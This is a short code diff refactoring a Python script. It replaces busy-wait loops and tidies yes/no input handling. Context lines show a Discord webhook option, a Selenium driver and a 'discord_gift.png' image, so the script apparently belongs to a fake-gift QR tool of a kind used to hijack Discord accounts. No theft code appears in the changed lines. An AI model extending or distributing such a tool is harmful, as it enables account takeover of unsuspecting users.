@@ -124,10 +124,10 @@ def main(webhook_url: str) -> None:
     thread_timer_killer.join(120)
     if thread_timer_killer.is_alive():
         e.set()
-        while True:
-            if not thread_timer_killer.is_alive():
-                main.driver.service.process.send_signal(SIGTERM)
-                break
+        while thread_timer_killer.is_alive():
+            continue
+        main.driver.service.process.send_signal(SIGTERM)
+
         try:
             os.remove('discord_gift.png')
         except BaseException:
@@ -186,8 +186,8 @@ if __name__ == "__main__":
     confir = Write.Input(
         "[*] Do you want to use a Discord Webhook URL ? [y/n] -> ",
         Colors.green_to_cyan,
-        interval=0.01)
-    if (confir == YES) or (confir == YES.upper()):
+        interval=0.01).lower()
+    if confir == "yes" or confir == "y":
         th_main = Thread(
             target=main,
             args=(
@@ -195,7 +195,7 @@ if __name__ == "__main__":
                     Colors.green_to_cyan,
                     interval=0.01), 
             ))
-    elif (confir == NO) or (confir == NO.upper()):
+    elif confir == "no" or confir == "n":
         th_main = Thread(target=main, args=(None,))
     else:
         raise SystemExit(Write.Print(
@@ -203,8 +203,7 @@ if __name__ == "__main__":
         Colors.yellow_to_green))
     Thread(target=pystray_icon).start()
     th_main.start()
-    while True:
-        if not th_main.is_alive():
-            pystray_icon.icon.stop()
-            break
+    while th_main.is_alive():
         time.sleep(SLEEP_TIME)
+    pystray_icon.icon.stop()
+
